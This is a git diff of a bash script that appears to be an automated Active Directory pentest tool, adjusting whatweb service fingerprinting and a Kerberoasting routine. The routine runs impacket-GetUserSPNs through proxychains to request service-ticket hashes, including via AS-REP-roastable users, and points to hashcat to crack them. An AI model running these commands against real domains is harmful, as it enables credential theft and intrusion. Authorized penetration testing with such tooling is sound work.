@@ -1367,15 +1367,16 @@ web () {
 			ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
 			hostname=$(grep -E "^$ip:" $DIR/hostname_file.txt | awk -F ":" '{print $2}')
 		elif [[ $line =~ ^([0-9]+)/tcp ]]; then
-			if control_ip_attack; then
+			port="${BASH_REMATCH[1]}"
+   			if control_ip_attack; then
 				# Extract port number and protocol
-				port="${BASH_REMATCH[1]}"
-				if [[ $line =~ (http|https) && ! $line =~ ncacn_http && $port != "5985" && $port != "5357" ]]; then
-				  whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
-				  HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
-				  Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
-				  green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
-				  rm /tmp/whatweb
+				if [[ "$line" =~ http|https ]] && [[ ! "$line" =~ ncacn_http ]] && [[ "$port" != "5985" && "$port" != "5357" ]]; then
+					echo $line
+					whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
+					HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
+					Title=$(cat /tmp/whatweb | grep -oP 'Title\[\K[^\]]+' || echo "No title identified")
+					green_log "${SPACE}${ip}:${port} ($hostname) -> ${HTTPServer} /// ${Title}"
+				  	rm /tmp/whatweb
 				fi
 				# Ajouter l'IP à son fichier correspondant
 				#echo "$ip" >> "${DIR_PORTS}/${port}.txt"
@@ -1464,17 +1465,18 @@ krb () {
 		if [[ -e "${Username}.ccache" ]]; then
 			export KRB5CCNAME=${Username}.ccache
 			rm $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
-			$proxychains impacket-GetUserSPNs $domain/$Username -no-pass -k -request -dc-host $DC_host >> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
+			$proxychains impacket-GetUserSPNs $domain/$Username -no-pass -k -request -dc-host $DC_host > $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
 		else
 			if [[ -e "$DIR_VULNS/krb/asreproasting_Users.txt" ]];then
 				while IFS= read -r line; do
 					asp_user=$(echo "$line" |awk -F'$' '{print $4}' |awk -F'@' '{print $1}')
-					$proxychains impacket-GetUserSPNs -no-preauth $asp_user -usersfile ${DIR}/users.txt -dc-host $DC_host -request $domain/ >> $DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt
+					$proxychains impacket-GetUserSPNs -no-preauth $asp_user -usersfile ${DIR}/users.txt -dc-host $DC_host -request $domain/ > $DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt
 				done < "$DIR_VULNS/krb/asreproasting_Users.txt"
+    				grep -s "krb5tgs" $DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt >> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt
 			fi
 		fi
 
-		if { ! grep -qs 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [[ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]] ; } || grep -qs 'krb5tgs' "$DIR_VULNS/krb/Kerberoasting_SPN_Users_preauth.txt"; then
+		if grep -qsv 'No entries' "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" && [ -e "$DIR_VULNS/krb/Kerberoasting_SPN_Users.txt" ]; then
 			green_log "${SPACE}[💀] Great, kerberoastable accounts found -> $DIR_VULNS/krb/Kerberoasting_SPN_Users.txt"
 			blue_log "${SPACE} [+] Use hashcat -m 13100 ... to bang them passwords"
 		fi
